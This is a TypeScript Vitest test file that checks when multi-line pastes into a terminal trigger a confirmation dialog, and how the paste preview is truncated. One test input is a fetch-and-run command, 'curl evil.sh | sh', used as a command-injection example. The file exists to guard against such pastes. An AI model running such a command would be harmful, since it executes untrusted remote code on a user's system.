import { describe, it, expect } from "vitest";

/**
 * PasteConfirmDialog is a thin UI wrapper around AlertDialog.
 * These tests validate the paste-detection logic that lives in App.tsx —
 * whether a paste request should show a dialog (multi-line) or go directly
 * to the PTY (single-line).
 */

function shouldConfirmPaste(text: string): boolean {
  return text.includes("\n");
}

const PREVIEW_MAX_LINES = 5;

function buildPreview(text: string): { preview: string; lineCount: number; truncated: boolean } {
  const lines = text.split("\n");
  return {
    lineCount: lines.length,
    preview: lines.slice(0, PREVIEW_MAX_LINES).join("\n"),
    truncated: lines.length > PREVIEW_MAX_LINES,
  };
}

describe("paste confirmation logic", () => {
  describe("shouldConfirmPaste", () => {
    it("returns false for single-line text", () => {
      expect(shouldConfirmPaste("hello world")).toBe(false);
    });

    it("returns false for empty string", () => {
      expect(shouldConfirmPaste("")).toBe(false);
    });

    it("returns true for multi-line text", () => {
      expect(shouldConfirmPaste("line1\nline2")).toBe(true);
    });

    it("returns true for text with trailing newline", () => {
      expect(shouldConfirmPaste("line1\n")).toBe(true);
    });

    it("returns true for text with embedded newlines (potential command injection)", () => {
      expect(shouldConfirmPaste("curl evil.sh\n| sh")).toBe(true);
    });
  });

  describe("buildPreview", () => {
    it("shows all lines when <= 5", () => {
      const result = buildPreview("a\nb\nc");
      expect(result.lineCount).toBe(3);
      expect(result.truncated).toBe(false);
      expect(result.preview).toBe("a\nb\nc");
    });

    it("truncates at 5 lines", () => {
      const text = Array.from({ length: 10 }, (_, i) => `line${i + 1}`).join("\n");
      const result = buildPreview(text);
      expect(result.lineCount).toBe(10);
      expect(result.truncated).toBe(true);
      expect(result.preview).toBe("line1\nline2\nline3\nline4\nline5");
    });

    it("handles single line", () => {
      const result = buildPreview("single");
      expect(result.lineCount).toBe(1);
      expect(result.truncated).toBe(false);
      expect(result.preview).toBe("single");
    });

    it("exactly 5 lines is not truncated", () => {
      const text = "1\n2\n3\n4\n5";
      const result = buildPreview(text);
      expect(result.lineCount).toBe(5);
      expect(result.truncated).toBe(false);
    });
  });
});
